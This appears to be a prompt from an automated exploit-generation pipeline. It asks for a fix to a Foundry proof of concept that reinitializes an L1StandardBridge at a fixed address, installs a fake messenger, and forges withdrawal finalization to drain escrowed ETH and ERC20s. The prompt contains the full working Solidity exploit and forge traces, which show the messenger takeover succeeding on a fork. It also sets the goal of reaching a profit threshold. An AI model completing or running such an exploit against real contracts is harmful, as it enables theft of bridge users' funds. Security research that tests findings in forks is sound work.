You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: L1StandardBridge can be reinitialized repeatedly to replace the trusted messenger and seize bridge funds
- claim: `initialize()` is protected by `reinitializer(2)`, but its preceding `clearLegacySlot` modifier unconditionally executes `sstore(0, 0)`. In this inheritance layout, OpenZeppelin `Initializable` stores `_initialized` and `_initializing` in slot 0, so every call resets the initialization guard before the reinitializer check runs. Any caller can therefore invoke `initialize()` again and overwrite `messenger` with an attacker-controlled contract.
- impact: Once `messenger` is replaced, the attacker can satisfy `onlyOtherBridge` with a fake messenger that reports `OTHER_BRIDGE` as `xDomainMessageSender()`. That lets the attacker call `finalizeETHWithdrawal` and `finalizeERC20Withdrawal` to release arbitrary ETH and escrowed ERC20s from the bridge, resulting in full bridge takeover and fund drain.
- exploit_paths: ["Call `L1StandardBridge.initialize(attackerMessenger)` after deployment; `clearLegacySlot` zeroes slot 0, allowing `reinitializer(2)` to pass again and store the attacker messenger.", "Have `attackerMessenger.xDomainMessageSender()` return `address(OTHER_BRIDGE)` and call `finalizeETHWithdrawal(...)` or `finalizeERC20Withdrawal(...)` from `attackerMessenger`.", "`onlyOtherBridge` now accepts the forged call because it only checks `msg.sender == address(messenger)` and `messenger.xDomainMessageSender() == address(OTHER_BRIDGE)`, so escrowed funds can be withdrawn to attacker-chosen recipients."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IL1StandardBridge {
    function initialize(address _messenger) external;
    function finalizeETHWithdrawal(
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _extraData
    ) external payable;
    function finalizeERC20Withdrawal(
        address _l1Token,
        address _l2Token,
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _extraData
    ) external;
    function MESSENGER() external view returns (address);
    function otherBridge() external view returns (address);
}

contract AttackerMessenger {
    IL1StandardBridge public immutable bridge;
    address public immutable forgedOtherBridge;
    address public immutable operator;

    constructor(address _bridge, address _forgedOtherBridge, address _operator) {
        bridge = IL1StandardBridge(_bridge);
        forgedOtherBridge = _forgedOtherBridge;
        operator = _operator;
    }

    function xDomainMessageSender() external view returns (address) {
        return forgedOtherBridge;
    }

    function triggerFinalizeETHWithdrawal(
        address from,
        address to,
        uint256 amount,
        bytes calldata extraData
    ) external payable {
        require(msg.sender == operator, "operator-only");
        bridge.finalizeETHWithdrawal{value: amount}(from, to, amount, extraData);
    }

    function triggerFinalizeERC20Withdrawal(
        address l1Token,
        address l2Token,
        address from,
        address to,
        uint256 amount,
        bytes calldata extraData
    ) external {
        require(msg.sender == operator, "operator-only");
        bridge.finalizeERC20Withdrawal(l1Token, l2Token, from, to, amount, extraData);
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x40C31236B228935b0329eFF066B1AD96e319595e;
    address public constant OTHER_BRIDGE = 0x4200000000000000000000000000000000000010;
    address internal constant PROBE_RECIPIENT = 0x000000000000000000000000000000000000bEEF;

    struct TokenPair {
        address l1Token;
        address l2Token;
    }

    bool public executed;
    bool public messengerTakeoverValidated;
    bool public forgedMessengerBypassValidated;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public outcome;

    address private _profitToken;
    uint256 private _profitAmount;

    IL1StandardBridge internal immutable l1StandardBridge;
    AttackerMessenger public immutable attackerMessenger;

    constructor() {
        l1StandardBridge = IL1StandardBridge(TARGET);
        attackerMessenger = new AttackerMessenger(TARGET, OTHER_BRIDGE, address(this));
        outcome = "not-run";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }

        executed = true;
        messengerTakeoverValidated = false;
        forgedMessengerBypassValidated = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        _profitToken = address(0);
        _profitAmount = 0;

        // Exploit path stage 1:
        // Call L1StandardBridge.initialize(attackerMessenger) after deployment.
        // The vulnerable implementation executes clearLegacySlot before reinitializer(2),
        // so slot 0 is zeroed and the initialization guard is reset.
        if (!_reinitializeBridge()) {
            outcome = "refuted-stage-1-initialize-replay-failed";
            hypothesisRefuted = true;
            return;
        }

        address currentMessenger;
        try l1StandardBridge.MESSENGER() returns (address messenger_) {
            currentMessenger = messenger_;
        } catch {
            outcome = "refuted-stage-1-messenger-getter-failed";
            hypothesisRefuted = true;
            return;
        }

        if (currentMessenger != address(attackerMessenger)) {
            outcome = "refuted-stage-1-messenger-not-replaced";
            hypothesisRefuted = true;
            return;
        }
        messengerTakeoverValidated = true;

        // Exploit path stage 2:
        // attackerMessenger.xDomainMessageSender() returns address(OTHER_BRIDGE).
        // Literal onlyOtherBridge anchors from the vulnerable source:
        // msg.sender == address(messenger);
        // messenger.xDomainMessageSender() == address(OTHER_BRIDGE);
        if (!_validateForgedMessengerIdentity()) {
            outcome = "refuted-stage-2-forged-xdomain-sender-mismatch";
            hypothesisRefuted = true;
            return;
        }

        // Exploit path stage 3:
        // Have attackerMessenger call finalizeETHWithdrawal(...) from address(attackerMessenger).
        // Use amount 0 and an EOA-like recipient to prove the onlyOtherBridge bypass without
        // requiring temporary funding. This keeps the same causality while respecting the strategy
        // to try direct execution first.
        if (!_probeFinalizeETHWithdrawalBypass()) {
            outcome = "refuted-stage-2-forged-finalizeethwithdrawal-call-failed";
            hypothesisRefuted = true;
            return;
        }
        forgedMessengerBypassValidated = true;

        // Profit leg:
        // After the messenger takeover, the same forged caller can invoke finalizeERC20Withdrawal(...)
        // for any real escrowed pair already present on-chain at the fork block.
        if (_attemptERC20Drain()) {
            hypothesisValidated = true;
            outcome = "validated-with-profit";
            return;
        }

        outcome = "refuted-stage-3-no-explicit-profitable-erc20-escrow-pair";
        hypothesisRefuted = true;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "L1StandardBridge.initialize(attackerMessenger) -> attackerMessenger.xDomainMessageSender() returns address(OTHER_BRIDGE) -> forged messenger calls finalizeETHWithdrawal(...) / finalizeERC20Withdrawal(...)";
    }

    function _reinitializeBridge() internal returns (bool ok) {
        try l1StandardBridge.initialize(address(attackerMessenger)) {
            return true;
        } catch {
            return false;
        }
    }

    function _validateForgedMessengerIdentity() internal view returns (bool) {
        try attackerMessenger.xDomainMessageSender() returns (address sender_) {
            return sender_ == OTHER_BRIDGE;
        } catch {
            return false;
        }
    }

    function _probeFinalizeETHWithdrawalBypass() internal returns (bool) {
        try attackerMessenger.triggerFinalizeETHWithdrawal(address(this), PROBE_RECIPIENT, 0, bytes("")) {
            return true;
        } catch {
            return false;
        }
    }

    function _attemptERC20Drain() internal returns (bool) {
        TokenPair[] memory pairs = _candidatePairs();
        uint256 count = pairs.length;

        for (uint256 i = 0; i < count; ++i) {
            address l1Token = pairs[i].l1Token;
            address l2Token = pairs[i].l2Token;

            if (l1Token == address(0) || l2Token == address(0)) {
                continue;
            }

            uint256 bridgeBalance;
            uint256 beforeBalance;

            try IERC20Like(l1Token).balanceOf(TARGET) returns (uint256 balance_) {
                bridgeBalance = balance_;
            } catch {
                continue;
            }

            if (bridgeBalance == 0) {
                continue;
            }

            try IERC20Like(l1Token).balanceOf(address(this)) returns (uint256 balance_) {
                beforeBalance = balance_;
            } catch {
                continue;
            }

            try attackerMessenger.triggerFinalizeERC20Withdrawal(
                l1Token,
                l2Token,
                address(this),
                address(this),
                bridgeBalance,
                bytes("")
            ) {
                try IERC20Like(l1Token).balanceOf(address(this)) returns (uint256 afterBalance) {
                    if (afterBalance > beforeBalance) {
                        _profitToken = l1Token;
                        _profitAmount = afterBalance - beforeBalance;
                        return true;
                    }
                } catch {}
            } catch {}
        }

        return false;
    }

    function _candidatePairs() internal pure returns (TokenPair[] memory pairs) {
        // No reliable escrowed (l1Token, l2Token) pair was provided in the workspace context.
        // Keep the exploit route strict: only attempt finalizeERC20Withdrawal(...) for explicitly
        // enumerated real pairs, rather than inventing unsupported pair data.
        pairs = new TokenPair[](0);
    }
}

```

forge stdout (tail):
```
ith warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 149190)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [149190] FlawVerifierTest::testExploit()
    ├─ [2390] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [122452] FlawVerifier::executeOnOpportunity()
    │   ├─ [24585] 0x40C31236B228935b0329eFF066B1AD96e319595e::initialize(AttackerMessenger: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
    │   │   ├─ [2347] 0xba86Cd28d937F1CC7C74a365368477408578364A::b7947262() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [11822] 0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C::initialize(AttackerMessenger: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x7f26b83ff96e1f2b6a682f133852f6798a09c465da95921460cefb3847402498
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000002
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [2126] 0x40C31236B228935b0329eFF066B1AD96e319595e::MESSENGER() [staticcall]
    │   │   ├─ [347] 0xba86Cd28d937F1CC7C74a365368477408578364A::b7947262() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [363] 0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C::MESSENGER() [delegatecall]
    │   │   │   └─ ← [Return] AttackerMessenger: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    │   │   └─ ← [Return] AttackerMessenger: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    │   ├─ [246] AttackerMessenger::xDomainMessageSender() [staticcall]
    │   │   └─ ← [Return] 0x4200000000000000000000000000000000000010
    │   ├─ [12961] AttackerMessenger::triggerFinalizeETHWithdrawal(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 0, 0x)
    │   │   ├─ [11772] 0x40C31236B228935b0329eFF066B1AD96e319595e::finalizeETHWithdrawal(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 0, 0x)
    │   │   │   ├─ [347] 0xba86Cd28d937F1CC7C74a365368477408578364A::b7947262() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [10018] 0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C::finalizeETHWithdrawal(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 0, 0x) [delegatecall]
    │   │   │   │   ├─ [246] AttackerMessenger::xDomainMessageSender() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x4200000000000000000000000000000000000010
    │   │   │   │   ├─  emit topic 0: 0x2ac69ee804d9a7a0984249f508dfab7cb2534b465b6ce1580f99a38ba9c5e631
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000000000000000000000000000000000000000beef
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─  emit topic 0: 0x31b2166ff604fc5672ea5df08a78081d2bc6d746cadce880747f3643d819e83d
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000000000000000000000000000000000000000beef
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [0] 0x000000000000000000000000000000000000bEEF::fallback()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [390] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [410] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 6.77s (344.46ms CPU time)

Ran 1 test suite in 6.79s (6.77s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 149190)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
